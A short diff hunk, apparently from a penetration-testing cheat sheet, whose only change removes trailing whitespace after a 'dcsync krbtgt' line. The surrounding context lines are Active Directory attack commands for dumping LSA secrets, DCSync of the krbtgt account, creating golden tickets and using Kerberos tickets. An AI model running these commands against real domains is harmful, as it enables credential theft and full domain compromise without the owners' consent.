@@ -255,7 +255,7 @@ lsa_dump_secrets                                            Dump LSA secrets
 password_change -u <user> -p <old password> -P <new password>
 
 dcsync_ntlm krbtgt
-dcsync krbtgt 
+dcsync krbtgt
 
 golden_ticket_create -d <domain> -u <user> -s <SID> -k
 kerberos_ticket_use /root/<domain>
